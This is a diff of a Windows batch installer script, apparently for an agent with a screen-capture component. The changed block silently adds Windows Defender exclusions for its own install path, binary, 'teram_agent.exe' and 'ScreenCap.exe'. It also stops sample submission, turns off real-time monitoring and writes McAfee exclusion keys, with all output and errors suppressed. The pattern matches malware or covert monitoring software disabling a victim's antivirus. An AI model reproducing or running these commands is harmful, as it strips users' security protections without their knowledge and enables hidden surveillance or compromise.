@@ -62,19 +62,14 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebCon
 :: ═══════════════════════════════════════════════════
 echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...
 
-:: --- Windows Defender (with 10s timeout — Tamper Protection may block these) ---
 powershell -NoProfile -Command ^
-  "$j = Start-Job -ScriptBlock { " ^
-  "  try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction Stop } catch {}; " ^
-  "  try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {}; " ^
-  "  try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {}; " ^
-  "  try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {}; " ^
-  "  try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {}; " ^
-  "  try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}; " ^
-  "  try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {} " ^
-  "}; " ^
-  "if (-not (Wait-Job $j -Timeout 10)) { Stop-Job $j; Write-Host '    Defender config timed out (Tamper Protection active). Skipping.' }; " ^
-  "Remove-Job $j -Force" >nul 2>&1
+  "try { Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Add-MpPreference -ExclusionProcess '%BIN_NAME%' -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Add-MpPreference -ExclusionProcess 'teram_agent.exe' -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue } catch {}; " ^
+  "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}" >nul 2>&1
 
 :: --- McAfee ---
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
